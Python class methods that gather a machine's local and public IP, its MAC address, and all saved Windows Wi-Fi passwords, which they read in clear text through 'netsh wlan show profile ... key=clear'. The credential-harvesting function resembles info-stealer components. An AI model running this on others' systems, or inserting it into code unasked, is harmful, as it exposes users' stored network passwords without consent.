def get_local_ip(self):
    """Returns the computer's local IP address."""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return local_ip
    except Exception as e:
        return f"[Error] Unable to get local IP: {e}"

def get_public_ip(self):
    """Returns the public IP address of the system."""
    try:
        public_ip = requests.get("https://api.ipify.org", timeout=5).text
        return public_ip
    except Exception as e:
        return f"[Error] Unable to get public IP: {e}"

def get_mac_address(self):
    """Returns the MAC address of the main network interface."""
    try:
        mac_num = uuid.getnode()
        mac = ':'.join(f'{(mac_num >> ele) & 0xff:02X}' for ele in range(0, 8 * 6, 8))[::-1]
        return mac
    except Exception as e:
        return f"[Error] Unable to get MAC address: {e}"

def get_wifi_password(self):
    """Returns saved Wi-Fi passwords (Windows only)."""
    try:
        # Get list of all saved Wi-Fi profiles
        profiles_data = subprocess.check_output(
            ["netsh", "wlan", "show", "profiles"],
            encoding="utf-8", errors="ignore"
        )
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_data)

        wifi_info = {}
        for profile in profiles:
            profile = profile.strip()
            try:
                # Get Wi-Fi password for each profile
                result = subprocess.check_output(
                    ["netsh", "wlan", "show", "profile", profile, "key=clear"],
                    encoding="utf-8", errors="ignore"
                )
                password = re.search(r"Key Content\s*:\s*(.*)", result)
                wifi_info[profile] = password.group(1) if password else "No password found"
            except subprocess.CalledProcessError:
                wifi_info[profile] = "Error reading profile"
        return wifi_info
    except Exception as e:
        return f"[Error] Unable to get Wi-Fi passwords: {e}"
